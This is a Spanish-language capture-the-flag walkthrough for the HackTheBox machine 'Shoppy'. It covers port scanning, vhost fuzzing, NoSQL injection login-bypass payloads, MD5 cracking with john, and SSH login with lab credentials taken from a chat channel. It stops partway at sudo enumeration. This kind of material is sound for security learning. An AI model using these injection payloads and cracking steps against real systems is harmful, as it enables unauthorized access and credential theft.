# Shoppy HTB


Primero que nada nos damos cuenta que tiene 3 puerto abiertos

```
nmap -sSV --open -vvv IP
nmap -sC -p 22,80,9093 IP
```

Esto re direcciona a shoppy.htb lo cual nos da indicios de que podria utilizar vhosting

# Fuzzing

```
wfuzz -c --hc=404,301 -t 200 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://shoppy.htb/FUZZ 
```


# Vhost Discovery

Virtual hosting es la capacidad de tener varios subdominos ( *.example.com ) en un mismo servidor 

>El virtualhost, o servidor virtual, es una forma de alojamiento web que permite que varias páginas web puedan funcionar en una misma máquina. Hay dos tipos de virtualhost:

Los que se basan en direcciones IP, donde cada página web tendrá una IP diferente.
***Los que se basan en nombres de dominio, donde una sola dirección IP funcionan varias páginas web.***

Aunque el navegador tendrá que diferenciar el tipo de virtualhost a la hora de gestionar la petición, la elección de una u otra no tiene ningún efecto para el usuario.

## WFUZZ

Para encontrar subdominios cuando sospechamos que se esta usando esta tecnica se fuzzea la header Host en busca de un resultado valido lo que indica un subdominio

```

wfuzz -c --hc=404,301 -t 200 -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shoppy.htb" http://shoppy.htb/ 

```

## Gobuster

```
gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 500 -u http://shoppy.htb 
Funciona tambien asi 
gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 500 -u shoppy.htb
Tambien asi solo lee bien el output
gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb 
```

Encontramos un logging

# No SQL Inyection

De alguna u otra manera ( la cual no entiendo aun) nos dimos cuenta que es una base de datos No SQL MongoDB intentamos unos payloads sencillos.

```
admin'||'1==1
admin'||'1=1
```

Y cualquiera de esos jala. Entramos


# Hash

Ya dentro pues si estas con el usuario admin lo mas logico es que buscaras ese no¿?

```
EL password del usuario admin
hash-identifier
john --format=raw-md5 -w $(locate rockyou.txt)  hashes

admin
emerald 

```

Pero que crees si vuelves a probar una inyeccion te manda no solo el hash de admin si no un usuario josh

```
josh 

remembermethisway

```

## Intrucion

Entramos con el usuario josh al subdominio que encontramos

> http://mattermost.shoppy.htb/shoppy/channels/deploy-machine

Ahi nos damos cuenta que existe un user y pass iniciamos sesion ssh.

```
username: jaeger
password: Sh0ppyBest@pp!
```


Se necesita enumerar los usuarios nos damos cuenta que esta un usuario deploy 

```
sudo -l

```

Ahi nos damos cuenta que comandos se pueden correr




















































